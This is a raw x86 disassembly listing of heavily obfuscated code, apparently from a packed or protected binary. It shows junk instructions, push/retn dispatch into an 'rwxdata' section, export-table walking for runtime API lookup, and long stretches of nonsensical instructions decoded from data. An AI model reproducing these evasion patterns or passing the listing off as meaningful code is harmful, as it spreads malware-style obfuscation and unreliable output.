ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_4dd074
not dl
pushf
clc
bt si 0xa
stc
mov dl [ esi ]
call sub_510701
mov [ esp + 0x14 ] ebx
lahf
mov [ esp + 0x10 ] 0xb
pushfd
not eax
lea eax [ rwxdata ]
pushad
jmp rwxdata
mov [ esp + 0x30 ] rwxdata
push 0x5ddd4019
push [ eax ]
pop [ esp + 0x30 ]
pushfd
mov [ esp + 0x4 ] si
push 0xfc4faf3d
push [ esp + 0x38 ]
retn 0x3c
sub_4dd10a
call sub_4d6ebe
[ edi ] [ esi ]
pushad
mov esi [ esp + 0x34 ]
mov [ esp ] 0x78
mov [ esp + 0x4 ] 0x6e
push [ esp + 0x4 ]
lea esp [ esp + 0x3c ]
jmp rwxdata
pushfd
call sub_4fd3de
sub [ ecx ] al
scasb [ edi ]
nop
and [ ebx ] esp
or al [ ecx - 0x5c ]
lea ebp [ esp + edi * 4 + 0x2f5c6dff ]
xor bh al
sub_4dd2bf
push ebp
bt di 0x9
rcr al cl
neg al
mov al [ edi ]
clc
cmp al 0x41
mov [ esp ] bh
mov [ esp ] 0x7e
lea esp [ esp + 0x4 ]
jb rwxdata
bt edi 0x8
mov ah [ esi ]
test di 0x596e
cmp dh 0x23
stc
cmp ah 0x41
pushfd
push 0xe06d2d36
mov [ esp + 0x4 ] sp
lea esp [ esp + 0x8 ]
jb rwxdata
pushfd
cmp edx 0x38ddeb10
cmp al 0x5a
mov [ esp ] 0x46
jmp rwxdata
pushad
jmp rwxdata
push ebp
clc
cmp ah 0x5a
jmp rwxdata
lea esp [ esp + 0x4 ]
ja rwxdata
or al al
jmp rwxdata
mov [ esp ] 0x72
lea esp [ esp + 0x4 ]
ja rwxdata
test ah ch
rol ah 0x3
setne ah
add al 0x20
pushfd
pushfd
jmp rwxdata
push 0xb420b2f6
pushfd
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
ja rwxdata
lea esp [ esp + 0x28 ]
je rwxdata
jmp rwxdata
test dh 0xbb
cmc
call sub_4d525f
mov [ esp + 0xc ] 0x0
pushad
push 0x67b798dd
lea eax [ LocalAlloc@IAT ]
pushfd
pushfd
mov [ esp + 0x34 ] rwxdata
mov [ esp ] 0x4334
push esi
mov [ esp ] 0xec2b54ef
call sub_4d7edd
bt di dx
or ah ah
push 0x13376c9e
lea esp [ esp + 0x4 ]
je rwxdata
stc
cmp al ah
call sub_4da2d3
mov edi [ edx + 0x1c ]
stc
add edi eax
cmp di 0x1c1b
stc
pushad
pushfd
mov edi [ edi + ecx * 4 ]
pushfd
push [ esp ]
test edi edi
jmp sub_4d6ea2
lea esp [ esp + 0x8 ]
ja rwxdata
push ecx
jmp rwxdata
jo rwxdata
cmc
push ebx
jmp rwxdata
pushad
push [ esp + 0x24 ]
retn 0x28
clc
test bx si
pushfd
cmp ah 0x2e
pushad
pushfd
push [ esp + 0x28 ]
retn 0x2c
cmp ah 0x2e
add ah 0x20
call sub_4d9d27
cwde
xchg ecx eax
push esp
jmp 0x3e6d744c
sub_4dd310
test edx edx
mov [ esp ] dl
pushfd
lea esp [ esp + 0x8 ]
je rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
adc cx sp
neg cl
btc cx bx
add ch 0xef
add edx eax
sbb ecx esi
test bh 0xe5
btr cx 0xf
mov ecx [ esi + 0x7c ]
ja rwxdata
jno rwxdata
bt ax cx
stc
add ecx edx
bt bp 0x3
pushfd
mov [ ebp - 0x10 ] ecx
test dh bh
or cl 0x6e
mov ecx [ ebp + 0xc ]
test si 0x96b4
bt bx cx
push 0xed7038f5
cmp ecx 0xffff
pushfd
pushad
mov [ esp ] 0xe0
mov [ esp ] 0x96
lea esp [ esp + 0x2c ]
jbe rwxdata
test bp ax
pushfd
call sub_24b33a
test ch al
pushad
add ecx edx
bt eax 0x12
mov [ ebp - 0x10 ] ecx
stc
mov ecx [ ebp + 0xc ]
test dh bh
cmp ecx 0xffff
jmp rwxdata
pushfd
test ah 0x5a
sub ecx [ edx + 0x10 ]
call j_sub_24c1b3
cmp edi [ edx - 0x11e8fd12 ]
push ebx
jl rwxdata
rcr di cl
shrd cx bx 0x5
btc cx 0x9
mov edi [ edx + 0x24 ]
shld cx sp cl
sub ch dh
sar cl cl
movzx cx dl
add edi eax
bswap bx
add ecx edi
mov ebx [ edx + 0x20 ]
rcl ch 0x5
btr cx 0xb
add ebx eax
shr ch cl
mov cl dl
mov [ ebp - 0x8 ] 0x0
neg cx
btr cx bx
mov ecx [ edx + 0x18 ]
jmp rwxdata
pushfd
lea esp [ esp + 0x24 ]
jbe rwxdata
pop edx
test eax 0x919c49ba
sahf
push ebp
into
and eax 0xf944816d
mov ebp 0x38b89631
xchg [ esp + ebx * 2 - 0x56 ] ch
dec eax
test dl dl
int 0x10
neg [ ebp + 0x43c7173 ]
enter 0xb254 0x8f
loopne rwxdata
and eax 0xa1348d88
0x220df669 0x5ad1
cmp ecx [ ebp - 0x8 ]
jmp rwxdata
call sub_4fe517
cwde
xchg ecx eax
aad 0x29
push ss
in eax dx
or eax 0x8d84802e
sar [ edi + 0x54 ] 0x9b
nop
jge rwxdata
cmp [ esp + ebp * 8 - 0x11064164 ] 0xea
mov [ 0xffffffff9830f048 ] al
and ebp [ edx + ebx * 8 + 0x5e ]
ja rwxdata
int3
pushfd
lea esp [ esp + 0x4 ]
jbe rwxdata
and al cl
push es
sbb al 0x79
sub bh 0x7d
stosd [ edi ]
shl [ esi + 0x3757cfc1 ] 0x14
aaa
mov ebp 0x47ce7608
imul ecx [ edi + 0x2dc79962 ] 0xc03f6400
push eax
pop ebx
insb
mov cl cl
pop ebx
outsb
je rwxdata
leave
cmp [ 0xffffffffad9061ec ] dl
inc esp
shl [ eax ] 0x7c
jo rwxdata
push 0x6a295e43
inc eax
fiadd [ esp + esi * 4 ]
aad 0x10
mov ch 0x7c
mov al 0x43
mov ebx cr3
add al 0xa2
inc eax
retn
ror di 0xe
lea edi [ 0xfffffffff59e35a9 ]
shr di 0xd
pushad
sub ecx 0x1
sub si cx
push ecx
bts di ax
mov [ ebp - 0x4 ] ecx
sub esp 0xffffffdc
shrd cx ax 0x6
not di
add esi 0x9f840703
mov ecx [ ebp - 0x8 ]
xadd si di
sar di 0xc
bts edi eax
add ecx [ ebp - 0x4 ]
pushfd
btr si si
not di
shr ecx 0x1
lea edi [ edx - 0x25f4a10 ]
bswap di
movsx di dl
stc
mov edi [ ebx + ecx * 4 ]
bsf si cx
bsf esi ebp
or si 0xe2a8
add edi eax
push [ esp ]
not esi
pop esi
pop esi
mov esi [ ebp + 0xc ]
push 0x7bd1062d
pushad
call sub_4dd10a
call sub_51040d
mov ch 0x76
shl [ edx ] cl
sub ebx edx
leave
xchg ecx eax
adc cl [ esi - 0x62 ]
pop ebp
in al 0x79
dec edx
hlt
jns rwxdata
and al 0xf
xchg dl dh
call 0xffffffffbb39fb56
jmp 0xffffffff91e9fb5d
sub al 0xd7
push esp
shl [ eax ] 0x1d
aam 0xdc
pop ss
rcl [ ebx + 0x4c ] cl
das
out dx eax
pop ebp
stosd [ edi ]
fiadd [ ecx + ebx + 0x1a ]
out dx eax
das
stosd [ edi ]
sbb eax 0x5282790e
or edi ebp
pop ebp
stosd [ edi ]
add cl [ ebx ]
sub_4dd3d0
lea esp [ esp + 0x34 ]
jne rwxdata
pushad
mov [ esp + 0xc ] cx
mov esp esi
pushad
pushad
pushfd
push ebp
lea esp [ esp + 0x48 ]
jmp rwxdata
jmp rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
bswap eax
mov [ edi - 0x1 ] 0x0
bswap ax
movzx ax bl
push ebx
mov ah 0xc5
jo rwxdata
pushfd
not ax
pushfd
lahf
lea eax [ rwxdata ]
pushfd
call sub_4fe34a
stosb [ edi ]
pushfd
mov [ esp + 0x4 ] di
pushfd
lea esp [ esp + 0x2c ]
jmp rwxdata
lea eax [ rwxdata ]
pushad
mov [ esp + 0x1c ] rwxdata
pushad
pushfd
mov [ esp + 0x3c ] eax
push ecx
push edx
push [ esp + 0x44 ]
retn 0x48
pushfd
call sub_4fd3de
sub [ ecx ] al
scasb [ edi ]
nop
and [ ebx ] esp
or al [ ecx - 0x5c ]
lea ebp [ esp + edi * 4 + 0x2f5c6dff ]
xor bh al
sub_4dd56d
mov ebx eax
pushfd
call sub_4d29c2
shr [ ebx - 0x28 ] cl
das
arpl [ edi - 0x21966ab9 ] bx
lahf
add [ eax + 0x33 ] ecx
lodsb [ esi ]
xchg esi eax
mov bl 0x42
push edi
stc
call 0xffffffff9a8b9bd3
movsb [ edi ] [ esi ]
cdq
push 0x18e49497
adc eax 0x494cb0ec
or ebx [ edx ]
stosd [ edi ]
inc edi
push [ esi ]
psubq mmx0 [ edx - 0x63452426 ]
out dx eax
sub_4dd712
lea esp [ esp + 0xc ]
setle cl
rol cl cl
stc
btr cx 0x3
mov edi edx
ror al 0x6
rcl al 0x2
movzx cx cl
mov ecx edi
not al
setae al
mov al [ ecx ]
jmp rwxdata
call sub_24b9e4
add [ eax ] al
inc edi
je rwxdata
pushad
mov [ esp ] dh
mov ah al
stc
clc
call sub_24b6e8
pushad
mov [ esp + 0x1c ] 0x2004961e
push esi
mov [ esp + 0x1c ] 0x81352a5a
pushfd
push [ esp ]
mov [ esp ] cl
mov [ esp + 0x4 ] 0x24ad71ac
lea esp [ esp + 0x24 ]
jmp rwxdata
pop di
xchg ebx eax
in eax 0xde
not cl
fadd [ esi + 0x6a ]
mov eax 0xb8cfae3e
jle rwxdata
outsd
jne rwxdata
pushad
pushad
mov [ esp + 0x3c ] ecx
jmp rwxdata
0x1c6450b2 0x4b23
fisubr [ edx ]
pop ecx
neg ch
cmp al 0xb
add al 0xf3
jl rwxdata
mov ecx 0x1f60f538
pop ss
sub al 0x10
xchg ebp eax
mov dl 0xd4
mov dl 0xc5
std
fcomp st0
loop rwxdata
loop rwxdata
inc esi
imul ebp [ ebp + 0x4e ] 0x41656d61
add ah bl
shr [ esi - 0x29 ] 0x1
mov [ cs : 0x3549baad ] eax
leave
dec edx
mov ecx 0x9bb9142a
cwde
outsd
sbb edx edi
js rwxdata
pushfd
mov [ esp + 0x3c ] ebp
call sub_51137f
je rwxdata
int 0xe6
imul ebx ebp 0xfffffff5
rcl [ edi + 0x68 ] 0x1
cmpsd [ esi ] [ edi ]
sbb bl ch
and dl [ eax ]
fisubr [ ecx - 0x38 ]
adc eax 0x648deb60
and al 0xc
and bh [ eax + 0x25 ]
xor al 0xd0
int1
hlt
js rwxdata
std
push es
pop ss
bound edx [ edi - 0x7 ]
add cl [ edi + 0x18 ]
sti
xor dh [ ebp - 0x71b7dbe2 ]
sub eax 0x983db5c2
adc al 0xb7
daa
mov [ 0xe249136 ] al
stc
0x565d
sbb edi [ esi + 0x417095a3 ]
retn 0xbf90
add [ eax - 0x61 ] esi
dec edi
aad 0x44
jpo rwxdata
bound ebp [ edx ]
adc dl bl
imul eax eax 0x507dda85
cmc
or al 0xa4
lds eax [ ecx ]
shr [ ecx ] cl
and [ ebx - 0x3c ] ch
xor ecx [ eax + 0x1f32beca ]
salc
push edi
scasb [ edi ]
xor ebx [ 0x19ea7985 ]
sbb ch cl
insb
sbb al 0x2b
sub bl dl
out dx eax
and eax 0x196e6696
mov dl 0x9c
xchg edi eax
and [ ebx ] 0x4
add [ edi - 0x40f80412 ] ebx
das
not edi
out dx eax
and eax 0xee9ba199
add [ esi ] edi
mov esi 0xfc11b476
int3
jmp rwxdata
jmp 0x7dd46972
sbb [ edx + 0x2383979c ] esi
add al 0x1
lahf
out dx al
sti
pop es
mov edi 0xd7f72f65
sub_4dd905
btc ebx 0x8
mov ebx eax
shl ecx 0x14
stc
bsf di ax
sbb cx si
mov edi eax
inc ch
mov ecx 0x104
pushfd
xor al al
mov [ esp ] ah
mov [ esp ] 0xc4
clc
pushad
[ edi ]
call sub_4da59e
out 0x40 eax
imul ebp ebx 0x14a633bf
sub al 0xd
out 0x8d al
mov esp 0x84afdced
jae rwxdata
add al 0x3c
in al 0x4c
0x1de65df3 0x7985
sub_4dda7c
lea esp [ esp + 0x8 ]
jae rwxdata
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
call j_sub_4d794b
sub_4ddd41
mov [ esp + 0x8 ] 0xdd67
lea edi [ edi + 0x1 ]
cwde
mov eax [ esp + 0x5c ]
mov [ esp + 0x8 ] 0xbe73
call sub_4d5037
lahf
inc esi
fld [ edx ]
mov esi [ ebp - 0x31aa28c3 ]
insb
adc [ ss : ecx + ebp * 8 + 0x18 ] esp
movsd [ edi ] [ esi ]
scasd [ edi ]
and al 0x2e
mov bl 0x9d
mov fs [ ebp - 0x22 ]
adc eax 0xa54ef102
sub [ 0x31bdd51e ] al
xor al cl
shl [ edx - 0x5 ] 0x42
int1
fstp [ eax ]
mov esi 0x4c9628ca
aas
mov al 0x92
imul ebx esp 0x597e6ad8
test al 0x58
lodsd [ esi ]
xchg edi eax
jge rwxdata
iretd
aam 0xef
loop rwxdata
or [ ecx - 0x17f7dbbc ] ecx
leave
fcom st6
jmp [ esi - 0x39 ]
adc [ edi + 0x6f1c3b0f ] dl
xchg ebx eax
sub_4ddf5f
pushfd
mov [ esp ] 0x5b
push [ edi ]
pop [ esp + 0x4 ]
clc
bt di 0xc
cmp edi ebx
push eax
pushfd
push edx
lea esp [ esp + 0x10 ]
ja rwxdata
cmc
cmc
sub edi 0x4
cmc
test al cl
push [ edi ]
stc
stc
stc
cmp edi ebx
pushfd
push 0x527ea9cf
call sub_4d557e
call sub_4de546
sub al bh
shr al 0x1
sub ebx edi
setl al
btr di ax
add ebx esp
cmp si 0x376f
mov edi ebx
shr al cl
mov al 0x2e
call sub_4d634b
jmp rwxdata
mov esp ebp
pushfd
lea ebp [ ecx * 2 - 0x1711967 ]
lea ebp [ ecx * 8 - 0x32b07e6 ]
pushfd
mov ebp [ esp + 0x8 ]
push ecx
pushad
push [ esp + 0x30 ]
retn 0x44
sub_4de1d2
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
ror al 0x6
rcl al 0x2
movzx cx cl
mov ecx edi
not al
setae al
mov al [ ecx ]
jmp rwxdata
shl eax 0x13
shl al 0x4
btr ax 0x9
sub edx edx
cmp esp eax
mov eax edx
pushad
mov al [ esp + 0x1c ]
shr al 0x1
or al 0xb5
add edi 0x1
or al 0xc3
mov al [ edi ]
cmp bx 0x10f8
test al al
call sub_4d63fc
fstp [ eax ]
sub eax ebx
cmp eax 0x31b67fb4
sti
call [ ebx ]
int3
pushad
mov [ esp ] dh
mov ah al
stc
clc
call sub_24b6e8
pushad
mov [ esp + 0x1c ] 0x2004961e
push esi
mov [ esp + 0x1c ] 0x81352a5a
pushfd
push [ esp ]
mov [ esp ] cl
mov [ esp + 0x4 ] 0x24ad71ac
lea esp [ esp + 0x24 ]
jmp rwxdata
pushad
pushad
mov [ esp + 0x3c ] ecx
jmp rwxdata
pushfd
mov [ esp + 0x3c ] ebp
call sub_51137f
sub_4de2ea
lea esp [ esp + 0x30 ]
ja rwxdata
seta ch
movzx ecx bl
dec ecx
mov ecx [ esi + 0x4 ]
stc
or ecx ecx
pushad
pushfd
mov [ esp + 0x18 ] 0xe4
lea esp [ esp + 0x24 ]
je rwxdata
movsx di bl
mov si si
mov di bp
push 0x4069a619
mov esi [ esp + 0x4 ]
not di
pushad
not di
mov edi [ esp + 0x28 ]
call sub_4d6b5e
btc bx bx
xchg bx di
clc
pushfd
add [ ebp - 0x4 ] ecx
xor di ax
clc
stc
sub ecx 0x8
jmp rwxdata
shl bl 0x5
bsr bx dx
setbe bh
shr ecx 0x1
shr bl cl
mov edi [ esi ]
inc bh
shl bh 0x1
add edi [ ebp + 0x10 ]
stc
add esi 0x8
add esp 0x4
shr bh 0x5
bsr bx bp
bswap bx
neg bx
mov bx [ esi ]
cmp si 0x5f65
shr ebx 0xc
bt bp di
call sub_4d6037
lea esp [ esp + 0x8 ]
jne rwxdata
push 0x7bd1062d
pushad
call sub_4dd10a
call sub_51040d
mov ch 0x76
shl [ edx ] cl
sub ebx edx
leave
xchg ecx eax
adc cl [ esi - 0x62 ]
pop ebp
in al 0x79
dec edx
hlt
bsr edi esi
btr di si
mov edi [ edx + 0x24 ]
test esi 0xe4b698ce
pushad
test ah 0xfe
add edi eax
mov [ esp ] edi
test bl 0xe8
bt edi 0x1c
pushad
movzx ecx [ edi + ecx * 2 ]
bt sp 0x7
inc di
mov di cx
mov edi [ edx + 0x1c ]
cmp bl 0x95
clc
pushfd
add edi eax
pushfd
clc
cmc
mov edi [ edi + ecx * 4 ]
pushfd
cmc
test edi edi
mov [ esp ] cl
call j_sub_24bd45
dec edi
dec esp
inc ebp
inc ecx
push ebp
push esp
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax + eax * 8 - 0x2ddbfb3a ] al
pushfd
mov [ esp ] cl
call sub_4dd712
sub_4de317
pushad
push edi
lea esp [ esp + 0x2c ]
jb rwxdata
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
cmp cx bp
call sub_4fefa4
add [ ecx ] bh
sub_4fd3de
lea esp [ esp + 0x8 ]
call sub_24a185
push 0x4c117177
pushad
lea esp [ esp + 0x24 ]
jae rwxdata
call sub_249ac5
bt dx bx
test ax bp
pushfd
pushfd
sub ecx ecx
push 0xab7848ae
lea esp [ esp + 0xc ]
jb rwxdata
push 0x490a9e50
push 0x15d55187
lea esp [ esp + 0x8 ]
call sub_24a185
jmp rwxdata
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_24a185
pushfd
lea esp [ esp + 0x4 ]
jae rwxdata
call sub_4dac58
add eax 0x54b18f26
jmp 0xfffffffffb1d90ea
pushad
jmp rwxdata
bt di 0xc
stc
call sub_4d295f
pushad
lea esp [ esp + 0x40 ]
call sub_4d7652
call sub_4d47e0
sub_4fd432
push [ esp ]
lea eax [ rwxdata ]
pushfd
push 0x742a95df
push [ esp ]
mov [ esp ] ch
mov [ esp + 0x30 ] rwxdata
mov [ esp + 0xc ] 0xf2
call sub_249ab0
cmp [ edx - 0x259a9565 ] 0x173a0a2d
sti
mov ch 0x11
out 0x5a eax
sub_4fd5ab
lea esp [ esp + 0x8 ]
jne rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
call sub_24b974
push 0x2004750c
call sub_4d2eec
pushfd
mov [ esp + 0xc ] eax
push [ esp + 0x8 ]
mov [ esp + 0x4 ] dl
push [ esp ]
pushad
push [ esp + 0x34 ]
retn 0x38
sub_4fd5f4
pushfd
mov edi [ ebp + 0x8 ]
pushfd
pushad
pushfd
lea esp [ esp + 0x34 ]
jle rwxdata
push ebx
mov [ esp ] 0xa257
push 0x653c54cf
lea esp [ esp + 0x8 ]
call sub_4dd2bf
pushad
lea esp [ esp + 0x20 ]
jne rwxdata
call sub_4dd2bf
jo rwxdata
call sub_2493e2
cwde
mov eax [ edx + 0x8 ]
pushad
mov [ esp + 0x8 ] cl
pushfd
lea esp [ esp + 0x24 ]
jmp rwxdata
push 0xed7e7fa6
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushad
pushfd
pushfd
lea esp [ esp + 0x28 ]
jne rwxdata
jmp rwxdata
pushfd
call sub_4dd26d
movzx ax dl
lea eax [ eax + 0x2d44bd0 ]
mov eax [ edx + 0x8 ]
pushad
pushfd
lea esp [ esp + 0x24 ]
jmp rwxdata
or ebx ebx
jmp sub_4da277
sub_4fd846
clc
cmp eax edx
push [ esp + 0x8 ]
jmp rwxdata
push edi
lea esp [ esp + 0x30 ]
jb rwxdata
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
pushfd
cmc
jmp rwxdata
pushfd
cmp eax [ ebp - 0x10 ]
mov [ esp + 0x4 ] ch
lea esp [ esp + 0x8 ]
jae rwxdata
shr bh cl
xor bh bl
add ecx edx
sub ebx 0xaf286f76
mov ebx eax
bts cx di
dec cl
mov edi eax
bts cx 0xb
rol cl 0x2
shr cl 0x1
mov ecx 0x104
cmp dl dl
push eax
pushad
sub al al
cmp sp dx
[ edi ]
mov [ esp ] esi
lea esp [ esp + 0x24 ]
js rwxdata
push ebx
call sub_4fd5ab
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
bswap edx
sub dx cx
xor eax eax
ror ecx cl
sub si 0x68b9
mov ecx edi
cmc
or esi edi
mov si 0x84bb
bts esi esi
sub ecx ebx
btr si bp
clc
mov esi esp
cmc
cmc
sub edi 0x4
cmc
test al cl
push [ edi ]
stc
stc
stc
cmp edi ebx
pushfd
push 0x527ea9cf
call sub_4d557e
call sub_4de546
sub_4fd852
lea esp [ esp + 0x8 ]
jne rwxdata
pushad
mov [ esp + 0xc ] cx
mov esp esi
pushad
pushad
pushfd
push ebp
lea esp [ esp + 0x48 ]
jmp rwxdata
movzx eax dl
jmp rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
movzx ax bl
mov [ edi - 0x1 ] 0x0
cwde
push ebp
bswap ax
mov [ esp ] ebx
jmp rwxdata
lea eax [ rwxdata ]
call sub_4ddfa3
sub_4fd86a
lea esp [ esp + 0x28 ]
jne rwxdata
call sub_2493e2
setne al
mov eax 0x869c0647
lea eax [ ecx - 0x57132541 ]
movsx eax dl
mov eax [ edx + 0x8 ]
pushad
mov [ esp ] bl
push [ esp + 0x8 ]
push 0x1c63f53b
lea esp [ esp + 0x28 ]
jmp rwxdata
jmp rwxdata
or ebx ebx
jmp sub_4da277
sub_4fd9ce
lea esp [ esp + 0x8 ]
jae rwxdata
push edx
dec bl
pushfd
inc ecx
lea esp [ esp + 0x8 ]
pushfd
cmp bp bp
mov [ esp ] esi
pushad
cmp ah 0x5
pushad
push [ esp + 0x4 ]
jmp rwxdata
call sub_4d786c
clc
push esi
bsf si si
shrd si cx 0x5
mov esi edi
stc
stc
call sub_4d7c9a
lea esp [ esp + 0x28 ]
jne rwxdata
lea esp [ esp + 0x48 ]
jae rwxdata
ror al 0x6
rcl al 0x2
movzx cx cl
mov ecx edi
not al
setae al
mov al [ ecx ]
jmp rwxdata
bsr ax di
mov ax 0x336e
bsr ax dx
sub edx edx
shr ax 0x9
and eax 0xc565c013
adc al ch
bt bx di
mov eax edx
push edx
test ax 0x731d
add edi 0x1
or al dl
add al ch
setbe al
mov al [ edi ]
cmc
cmp cl cl
jmp rwxdata
setns bl
pushad
dec bl
inc ecx
lea esp [ esp + 0x20 ]
cmp bh dh
cmp dl ch
bt sp si
clc
cmp eax 0x7f
jpe rwxdata
pushad
mov [ esp ] dh
mov ah al
stc
clc
call sub_24b6e8
pushad
mov [ esp + 0x1c ] 0x2004961e
push esi
mov [ esp + 0x1c ] 0x81352a5a
pushfd
push [ esp ]
mov [ esp ] cl
mov [ esp + 0x4 ] 0x24ad71ac
lea esp [ esp + 0x24 ]
jmp rwxdata
test al al
call sub_4dc222
pushfd
ja rwxdata
pushad
pushad
mov [ esp + 0x3c ] ecx
jmp rwxdata
push esp
pushfd
call sub_4d8aad
push esi
popfd
mov [ 0xffffffff9835be51 ] al
push es
pop ss
stosb [ edi ]
loope rwxdata
add dl bh
pushfd
loop rwxdata
and bl al
rol bl cl
xchg ebp eax
pushad
bswap eax
mov eax ebp
pushfd
neg bl
stc
sbb bl 0xb9
mov bl 0x1
add esp 0x24
test ah 0x6d
js rwxdata
pushfd
mov [ esp + 0x3c ] ebp
call sub_51137f
mov bh 0x75
push ecx
mov edx 0x33b9e5f
loope rwxdata
mov edx 0x41c47a49
mov al 0xd0
sub al 0x7c
jo rwxdata
inc ecx
inc eax
mov [ 0x7cde7908 ] eax
jpe rwxdata
xchg [ eax ] edi
add edi [ ebx - 0x262e1ff3 ]
cld
mov eax 0x73be2b29
push 0xffffffc7
aam 0x7e
imul edx ebp 0x1
les eax [ edi + 0x15 ]
sub al 0xa8
add eax 0x624124bf
movsd [ edi ] [ esi ]
and edi ebp
0x1fa39105 0xa5ba
shr ebx 0x1
out dx al
mov ecx 0x23b60a7d
add bh dh
loop rwxdata
imul edi ecx 0x3ef815c0
xor [ esi - 0x4608848 ] edx
adc [ esi - 0x7e ] eax
or esp 0x16dc4688
in al dx
mov ch [ eax + 0x27 ]
out dx eax
or dh [ ebx - 0x3b899178 ]
fistp [ eax + 0x78 ]
les ecx [ eax - 0x4eb2b59e ]
0x8b262d23 0x95cf
adc dh bh

adc eax 0xbf05a82c
and al 0x41
bound esp [ ebp + 0x59aef21 ]
xchg ecx eax
mov [ 0x64a5ba1f ] eax
shr ebx 0x1
push ebp
mov eax 0x4db5d395
add ebp eax
adc ebx [ edx + 0x5981177c ]
neg [ ecx ]
push ss
mov [ 0x509c39ad ] eax
0x2bdc5e9a 0xf75a
mov ch 0x4d
ja rwxdata
sub_4fdad8
mov [ esp + 0x4 ] dx
mov [ esp + 0x8 ] 0x7803194f
pushad
push 0xc48d86c3
pushfd
mov [ esp + 0x4 ] 0x97
lea esp [ esp + 0x30 ]
jmp rwxdata
jmp rwxdata
push esp
mov [ esp ] ecx
pushfd
mov [ esp ] ebp
call sub_5136b7
pushfd
mov [ esp + 0x8 ] 0x73
mov [ esp + 0x44 ] 0x0
mov [ esp ] 0x70da
lea esp [ esp + 0x44 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_4fdafa
push [ esp ]
mov eax [ esp + 0x8 ]
call sub_24bedd
jmp rwxdata
jmp rwxdata
push 0x1aef6166
mov [ esp ] 0x4904cf03
jmp rwxdata
push 0xfa5b90c1
push 0xf74bf6d7
pushfd
lea esp [ esp + 0x8 ]
jmp rwxdata
pushad
pushfd
push 0x98dc7120
push [ esp + 0x14 ]
mov [ esp + 0x28 ] ecx
pushfd
mov [ esp + 0x28 ] ebp
call sub_5135bd
pushfd
pushfd
pop [ esp ]
pushfd
push [ esp + 0x4 ]
pop [ ebp ]
pushfd
lea esp [ esp + 0xc ]
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
